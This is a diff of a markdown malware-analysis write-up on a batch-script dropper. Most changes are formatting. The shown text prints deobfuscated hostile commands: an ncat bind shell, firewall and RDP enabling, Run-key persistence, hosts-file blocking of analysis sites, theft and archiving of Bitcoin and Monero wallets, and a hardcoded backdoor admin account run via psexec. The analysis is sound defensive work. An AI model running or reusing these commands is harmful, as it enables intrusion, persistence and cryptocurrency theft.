@@ -35,6 +35,7 @@ Funny looking Vbs file found on AppAnyRun:
 * https://app.any.run/tasks/f8665094-5a65-4feb-9ce5-0264ab8eb192/
 
 Base Details:
+```
 * MD5
     * C4FF2DA534FC1815D2FEB69A151B3049
 * SHA1
@@ -42,6 +43,7 @@ Base Details:
 * SHA256
     * C84B88B2FAAD58983F02456757D0E08D99C30CCAF72A2E6B191181926FDB44A2
 * Unknown to VT.
+```
 
 ## Initial Code Extracted:
 ```python
@@ -89,6 +91,7 @@ Low amount of imports and strings, expected considering we saw this is likely pa
 ![image tooltip here](/images/img7.png)
 
 ### Basic info Gathered:
+```
 * Md5:
     * D3159DDCF2ED341FB9BCC2615572AD40
 * Sha1:
@@ -108,7 +111,7 @@ Low amount of imports and strings, expected considering we saw this is likely pa
         * Mon Nov 08 08:12:07 2010
     * certificate-stamp: 
         * Sun Jul 17 08:43:42 2022
-
+```
 
 
 
@@ -137,6 +140,7 @@ Another interesting resource is this one as it has what appears to be a bat file
 ![image tooltip here](/images/img14.png)
 
 ### Basic info:
+```
 * md5
     * 0B76FFD7355C0599729C3AD70A56A628
 * sha1
@@ -161,7 +165,7 @@ Another interesting resource is this one as it has what appears to be a bat file
     * GUI
 * compiler-stamp
     * 0x4CD7F727 (Mon Nov 08 08:12:07 2010)
-
+```
 
 ### Inspecting dump of resource:
 Taking a look at the dump of the resource we did, we can see this is code that will likely be executed.
@@ -233,11 +237,13 @@ Hopefully if this is how it works it will then
 * Write to it 
 * When ready execute it.
 Lets confirm our assumptions now:
+
 #### Resources
 As expected the Resource related APIs are called to grab the contents of the two resources present in the sample:
 
 ![image tooltip here](/images/img24.png)
 ![image tooltip here](/images/img25.png)
+
 #### File Creation
 CreateFile is used to create the "01010.bat" file.
 At this point the handle for the file is "1FC" and the file still has no content.
@@ -281,6 +287,7 @@ This is te perfected moment to extract it since it will later down the chain be 
 Again, lets grab some obvious changes that were made (not a complete list) from two sources:
 * Registry
 * File System
+
 #### Registry Artifacts
 It seems the executable attempts to make sure that it can change the registry by setting this value to ´
 * https://social.technet.microsoft.com/Forums/en-US/8cab5272-77fc-4642-a0fe-8f41e3fb4a5d/regedit-disabled-by-administrator?forum=winservergen
@@ -316,13 +323,15 @@ v2.27|Action=Allow|Active=TRUE|Dir=Out|Protocol=6|LPort=21|Name='FTc'|`
 
 #### File System Artifacts
 Three files were created (for which 2 of them are the same only, different name and different locations):
+```
 * C:\Users\XXX\Desktop\service.cmd	
     * 57d8a5d51dac1c562a76747db459dbeeb06a0024d463bd9ebd778ab81c500127
 * C:\Users\XXX\Desktop\svc.bat
     * 57d8a5d51dac1c562a76747db459dbeeb06a0024d463bd9ebd778ab81c500127
 * C:\Users\XXX\Desktop\vbs.vbs
     * 39893bb8b88d8e5042e9ad22a4cc9b1573499610b15c5ea12e55e831e6faf61c
-    
+```
+
 ![image tooltip here](/images/img20.png)
 
 
@@ -333,10 +342,12 @@ C:\WINDOWS\system32\cmd.exe /c ""C:\Users\XXX\AppData\Local\Temp\C93E.tmp\01010.
 ```
 * This is the name we saw on one resource
 * After execution the folder is empty, which means it was deleted, likely a bit after its execution.
+
 ```python
 C:\WINDOWS\system32\cmd.exe /c ""C:\Users\XXX\AppData\Local\Temp\svc.bat" x"
 ```
 * Svc.bat is the name we saw on another resource
+
 ```python
 C:\WINDOWS\system32\cmd.exe /c chcp
 ```
@@ -352,30 +363,37 @@ netsh advfirewall firewall add rule name='BC' dir=in action=allow protocol=TCP l
 netsh advfirewall firewall add rule name='FTd' dir=out action=allow protocol=TCP localport=20
 ```
 * We already identified this activity
+
 ```python
 netsh advfirewall firewall add rule name='FTc' dir=out action=allow protocol=TCP localport=21
 ```
 * We already identified this activity
+
 ```python
 REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v "DisableRegistryTools" /t REG_DWORD /d "0" /f
 ```
 * We already identified this activity
+
 ```python
 REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
 ```
 * We already identified this activity
+
 ```python
 REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d "0" /f
 ```
 * RDP Setup related
+
 ```python
 REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fSingleSessionPerUser"/t REG_DWORD /d "0" /f
 ```
 * RDP Setup related
+
 ```python
 REG ADD HKCU\Software\Policies\Microsoft\Windows\System /v "DisableCMD" /t REG_DWORD /d "0" /f
 ```
 * Disable CMD
+
 ```python
 netsh advfirewall firewall set rule group="remote desktop" new enable=yes
 ```
@@ -397,6 +415,7 @@ For now we can consider this as gibberish and almost ignore it, however two stri
 Lets just remove all of them and continue our analysis.
 
 We can also now clearly see that these are all segments of code which are identified by the following names:
+```
 * ":i"
 * ":Azazel"
 * ":Axel"
@@ -410,6 +429,7 @@ We can also now clearly see that these are all segments of code which are identi
 * ":5"
 * ":sex"
 * ":6"
+```
 
 My bash is clearly rusty but the expectation here is that a deobfuscation function will be called replacing the weird strings and then all of them will be called in some sort of order using "goto" functions.
 
@@ -467,12 +487,12 @@ netsh advfirewall firewall add rule name='FTc' dir=out action=allow protocol=TCP
 netsh advfirewall firewall set rule group="remote desktop" new enable=yes
 ```
 * We already identified these actions.
+
 #### Conclusion:
 * ":i" is responsible for setting up firewall rules and groups.
 
 
 ### Analysis of deobfuscated ":Azazel"
-
 ```bash
 
 cd tempset "string112=UkVHIEFERCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiAiRGlzYWJsZVJlZ2lzdHJ5VG9vbHMiIC90IFJFR19EV09SRCAvZCAiMCIgL2Y="for /f "tokens=* delims=" i in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""string112"""^)^)') do 
@@ -512,7 +532,6 @@ REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 * It is also responsible for setting up the host for RDP connections.
 
 ### Analysis of deobfuscated ":Axel"
-
 ```bash
 cd temp
 setlocal EnableDelayedExpansion
@@ -543,7 +562,6 @@ REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Win
 * "Axel" responsible for hiding "service.cmd" and setting persistence on CurrentVersion\Run "Windows Services"
 
 ### Analysis of deobfuscated ":Forever"
-
 ```bash
 cd tempset "string117=UkVHIEFERCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiAiRGlzYWJsZVJlZ2lzdHJ5VG9vbHMiIC90IFJFR19EV09SRCAvZCAiMSIgL2Y="
 for /f "tokens=* delims=" i in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""string117"""^)^)') do 
@@ -560,7 +578,6 @@ REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v "Disab
 * Disables Windows registry
 
 ### Analysis of deobfuscated ":yuum"
-
 ```bash
 cd temp
 copy /Y 0 "windir\system32\winlogon.exe"
@@ -630,7 +647,6 @@ echo 127.0.0.1 joesandbox.com>>Hosts
 * Prevents updates and analysis tool access by setting localhost to host file.
 
 ### Analysis of deobfuscated ":loop"
-
 ```bash
 cd tempset "string6=bmNhdCAtLXNzbCAtbHZwIDUxNTAwIC1lIGNtZC5leGU="
 for /f "tokens=* delims=" i in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""string6"""^)^)') do 
@@ -648,8 +664,6 @@ ncat --ssl -lvp 51500 -e cmd.exe
 * Binds a shell listening on port 51500 with verbose and using SSL to cmd
 
 ### Analysis of deobfuscated ":3"
-
-
 ```bash
 cd temp
 echo host *localhost*>>nt.txttimeout /t 1 >nul
@@ -696,7 +710,6 @@ goto 4
 
 
 ### Analysis of deobfuscated ":4"
-
 ```bash
 cd temp
 echo :: -------- BTC Steal --- :: >>cmd.dat
@@ -710,13 +723,13 @@ goto zip)
 else (goto rar
 )
 ```
+
 #### Conclusion:
 * Steals bitcoin wallets from "appdata\Bitcoin\wallets" to "temp\btc"
 * Steals monero wallets from "userprofile\Documents\Monero\wallets" to "temp\xmr"
 * Decides if it should call "zip" or "rar" based on if "programfiles\7-Zip\7z.exe" is present on host.
 
 ### Analysis of deobfuscated ":rar"
-
 ```bash
 cd programfiles\WinRar
 set "string17=cmFyIGEgLXIgLXJyICV0ZW1wJVxidGMucmFyICV0ZW1wJVxidGM="
@@ -730,18 +743,18 @@ powershell cmd /c start /b decoded18 >nul
 timeout /t 3 >nul
 goto 5
 ```
-Decoded base64 strings:
 
+Decoded base64 strings:
 ```bash
 rar a -r -rr %temp%\btc.rar %temp%\btc
 rar a -r -rr %temp%\xmr.rar %temp%\xmr
 ```
+
 #### Conclusion:
 * Zips using rar "%temp%\btc" into "%temp%\btc.rar"
 * Zips using rar "%temp%\xmr" into "%temp%\xmr.rar"
 
 ### Analysis of deobfuscated ":zip"
-
 ```bash
 cd programfiles\7-Zipset "string15=N3ogYSAldGVtcCVcYnRjLjd6ICV0ZW1wJVxidGM="
 for /f "tokens=* delims=" i in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""string15"""^)^)') do 
@@ -757,12 +770,12 @@ Decoded base64 strings:
 7z a %temp%\btc.7z %temp%\btc
 7z a %temp%\xmr.7z %temp%\xmr
 ```
+
 #### Conclusion:
 * Zips using rar "%temp%\btc" into "%temp%\btc.7z"
 * Zips using rar "%temp%\xmr" into "%temp%\xmr.7z"
 
 ### Analysis of deobfuscated ":5"
-
 ```bash
 cd temp
 ECHO host *localhost*>>nts.txt
@@ -809,6 +822,7 @@ if exist temp\sys.exe (
 goto sex) else (
 goto 6)
 ```
+
 #### Conclusion:
 * Echos username "cli" and pass "h4x" into "cmd.dat".
 * Grabs psexec.exe
@@ -822,7 +836,6 @@ goto 6)
 
 
 ### Analysis of deobfuscated ":sex"
-
 ```bash
 cd temp
 set "string7=dGFza2tpbGwgL0YgL0lNIHN5cy5leGU="
@@ -838,11 +851,11 @@ Decoded base64 strings:
 taskkill /F /IM sys.exe
 sys.exe
 ```
+
 #### Conclusion:
 * Kills "sys.exe" execution and starts a new one from the "sys.exe" which should be located on temp folder since the execution of ":5"
 
 ### Analysis of deobfuscated ":6"
-
 ```bash
 cd temp
 set "string9=bmV0IHVzZXIgYWRteSBoNHgwcjY5IC9hZGQ="
@@ -864,9 +877,10 @@ Decoded base64 strings:
 net user admy h4x0r69 /add
 net localgroup Administrator admy /add
 net use \\127.0.0.1\ipc$ h4x0r69 /u:"admy"
-```
 COPY 0 \\127.0.0.1\ADMIN$\SYSTEM32\svchost.cmd /y
 start /i /min /wait /B temp\psexec \\127.0.0.1 -u admy -p "h4x0r69" -d cmd.exe /c 0
+```
+
 
 #### Conclusion:
 * Adds user admy with password "h4x0r69"
@@ -880,30 +894,3 @@ start /i /min /wait /B temp\psexec \\127.0.0.1 -u admy -p "h4x0r69" -d cmd.exe /
 * At this point one key information missing is how the attacker knowns the IP of the victim host to access it? Will its just scan several hosts for the known FTP or open port? This is likely not the case and either I missed this information or the sample present on AppAnyRun is not the inital stage and that can be observed earlier in the infection chain.
 * What is the meaning of the curl -T command with what appears to be domains and the ftp?  
 * Im still unaware on the usage of curl -T with what appears to be domains (vasb.qng, fgrny.qng, ybt.gzc) and ftp. Could this be related to the first question?
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
